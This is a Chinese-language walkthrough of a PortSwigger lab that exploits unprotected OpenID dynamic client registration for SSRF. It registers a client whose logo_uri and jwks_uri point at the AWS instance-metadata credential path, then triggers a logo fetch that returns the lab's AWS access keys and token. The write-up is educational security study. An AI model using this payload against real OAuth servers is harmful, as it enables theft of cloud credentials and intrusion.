

### 未受保护的动态客户端注册

实验：通过 OpenID 动态客户端注册实现 SSRF
https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration

使用主题教程信息，从标准端点读取配置文件
GET /.well-known/openid-configuration HTTP/2
内容为
```json
{
  "authorization_endpoint": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/auth",
  "claims_parameter_supported": false,
  "claims_supported": [
    "sub",
    "name",
    "email",
    "email_verified",
    "sid",
    "auth_time",
    "iss"
  ],
  "code_challenge_methods_supported": [
    "S256"
  ],
  "end_session_endpoint": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/session/end",
  "grant_types_supported": [
    "authorization_code",
    "refresh_token"
  ],
  "id_token_signing_alg_values_supported": [
    "HS256",
    "ES256",
    "EdDSA",
    "PS256",
    "RS256"
  ],
  "issuer": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net",
  "jwks_uri": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/jwks",
  "registration_endpoint": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/reg",
  "response_modes_supported": [
    "form_post",
    "fragment",
    "query"
  ],
  "response_types_supported": [
    "code"
  ],
  "scopes_supported": [
    "openid",
    "offline_access",
    "profile",
    "email"
  ],
  "subject_types_supported": [
    "public"
  ],
  "token_endpoint_auth_methods_supported": [
    "none",
    "client_secret_basic",
    "client_secret_jwt",
    "client_secret_post",
    "private_key_jwt"
  ],
  "token_endpoint_auth_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "token_endpoint": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/token",
  "request_object_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "request_parameter_supported": false,
  "request_uri_parameter_supported": true,
  "require_request_uri_registration": true,
  "userinfo_endpoint": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/me",
  "userinfo_signing_alg_values_supported": [
    "HS256",
    "ES256",
    "EdDSA",
    "PS256",
    "RS256"
  ],
  "introspection_endpoint": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/token/introspection",
  "introspection_endpoint_auth_methods_supported": [
    "none",
    "client_secret_basic",
    "client_secret_jwt",
    "client_secret_post",
    "private_key_jwt"
  ],
  "introspection_endpoint_auth_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "revocation_endpoint": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/token/revocation",
  "revocation_endpoint_auth_methods_supported": [
    "none",
    "client_secret_basic",
    "client_secret_jwt",
    "client_secret_post",
    "private_key_jwt"
  ],
  "revocation_endpoint_auth_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "claim_types_supported": [
    "normal"
  ]
}
```

识别到注册端点
```"registration_endpoint":"https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/reg"```

进行动态注册，使用服务器端请求位置不是设置 redirect_uris，而是设置验证过程中 oauth服务器读取配置的url
此处设置了 logo_uri 与 jwks_uri
POST /reg HTTP/2
```json
{
    "application_type": "web",
    "redirect_uris": [
        "https://foo.com/callback",
        "https://bar.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
}
```
HTTP/2 201 Created
```json
{
  "application_type": "web",
  "grant_types": [
    "authorization_code"
  ],
  "id_token_signed_response_alg": "RS256",
  "post_logout_redirect_uris": [],
  "require_auth_time": false,
  "response_types": [
    "code"
  ],
  "subject_type": "public",
  "token_endpoint_auth_method": "client_secret_basic",
  "introspection_endpoint_auth_method": "client_secret_basic",
  "revocation_endpoint_auth_method": "client_secret_basic",
  "require_signed_request_object": false,
  "request_uris": [],
  "client_id_issued_at": 1762912946,
  "client_id": "x1_uGKounfdC-Ivc7Jrvt",
  "client_name": "My Application",
  "client_secret_expires_at": 0,
  "client_secret": "FQRVYo_y_PkJ8d94mubh5hMYXo32K9Z05oQqh3WB7iE-526fJ7jXRG3Oy7v5azES8yqnw8_HILEQxymSshdpJg",
  "jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
  "redirect_uris": [
    "https://foo.com/callback",
    "https://bar.com/callback2"
  ],
  "registration_client_uri": "https://oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net/reg/x1_uGKounfdC-Ivc7Jrvt",
  "registration_access_token": "2u8pEmS2yj4OoW8CAMheXw0lZDeWbnTqs-9V_qNZa3o"
}
```

参考应用程序的格式构建动态注册的客户端请求的初始url
GET /auth?client_id=x1_uGKounfdC-Ivc7Jrvt&redirect_uri=https://foo.com/callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net
在浏览器中访问
其中对logo url的请求
GET /client/x1_uGKounfdC-Ivc7Jrvt/logo HTTP/2
Host: oauth-0aaf007a04daea2581b2aa43025a0088.oauth-server.net
Cookie: _session=zaaCifliP05nRrR6nONYi; _session.legacy=zaaCifliP05nRrR6nONYi

响应为设置的目标文件内容
```json
{
  "Code" : "Success",
  "LastUpdated" : "2025-11-12T00:59:11.542966031Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "Z9xVXSf0sqaRhiAq5PJY",
  "SecretAccessKey" : "FARaAStuHKLYJJRGa5qw0QushkTU9OO284CP9xkk",
  "Token" : "5CaQaBaus3yGcaYi1MuQmaIhdYaBDLXCYGnE0Iqk30g2YzBvLmXz0BUyVr44CBrqYHo3j978yfRKuextOgxR52pA7faXHvl3Xrkd47DLpeKHKjmo6Vrq9Iz4ELAdoNkbMRlpm21AGhXzTNMSFB8tTc3XWMp4Vzl5AItUSPmnEd8q4lwPuo2nqxHUG1YLtdPyGnQl1v0u1hzQVoHAXvJXDRr8mNc0fpX1uSk5e69dKjq8WUmcRzLW5z72OdjaSeLQ",
  "Expiration" : "2031-11-11T00:59:11.542966031Z"
}
```